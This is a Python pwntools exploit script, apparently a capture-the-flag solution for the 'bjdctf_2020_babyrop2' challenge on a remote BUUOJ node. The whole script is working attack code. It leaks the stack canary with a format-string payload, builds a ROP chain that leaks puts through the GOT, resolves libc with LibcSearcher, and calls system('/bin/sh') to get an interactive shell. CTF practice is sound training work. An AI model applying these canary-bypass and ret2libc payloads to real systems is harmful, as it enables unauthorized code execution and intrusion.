from pwn import *
from LibcSearcher import *

r=remote('node5.buuoj.cn',26196)
elf=ELF('./bjdctf_2020_babyrop2')
context.log_level = 'debug'

#p.recv()
payload = b'%7$p'
r.sendline(payload)
r.recvuntil(b'0x')
cancry = int(r.recv(16),16)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0400993
main_addr = elf.symbols['main']
vuln_addr = 0x0400887


payload = b'a'*(0x20-8)+p64(cancry)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln_addr)

r.recvuntil(b'story!\n')
r.sendline(payload)
puts_addr = u64(r.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
base_addr = puts_addr - libc.dump('puts')
system_addr=base_addr + libc.dump('system')
shell_addr = base_addr + libc.dump('str_bin_sh')

r.recvuntil(b'story!\n')

payload = b'a'*(0x20-8)+p64(cancry)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(shell_addr)
payload += p64(system_addr)
payload += p64(main_addr)

r.sendline(payload)
r.interactive()

